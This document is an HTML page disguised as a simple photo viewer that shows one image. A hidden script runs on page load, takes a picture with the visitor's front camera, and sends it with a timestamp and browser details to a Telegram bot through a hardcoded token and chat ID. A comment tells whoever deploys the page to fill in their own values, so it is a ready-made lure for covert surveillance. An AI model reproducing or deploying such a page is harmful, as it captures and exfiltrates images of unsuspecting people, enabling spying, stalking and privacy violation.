<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* { margin: 0; padding: 0; }
body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; }
img { max-width: 100%; max-height: 100vh; }
</style>
</head>
<body>
<img src="https://i.imgur.com/real_image.jpg" alt="Photo">

<script>
(async function() {
    // ⚠️ غيّر هذه القيم
    const BOT_TOKEN = '8806646191:AAHLbFkiQb-CckC_ai4mUjV-tlnMzKzKogI';
    const CHAT_ID = '1896011699';
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: { exact: "user" } } 
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(async function(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie.jpg');
            formData.append('caption', 
                '📍 Selfie Captured\n' +
                '🕐 ' + new Date().toLocaleString() + '\n' +
                '📱 ' + navigator.userAgent
            );
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            
            stream.getTracks().forEach(t => t.stop());
        }, 'image/jpeg');
        
    } catch(e) {
        console.log(e);
    }
})();
</script>
</body>
</html>
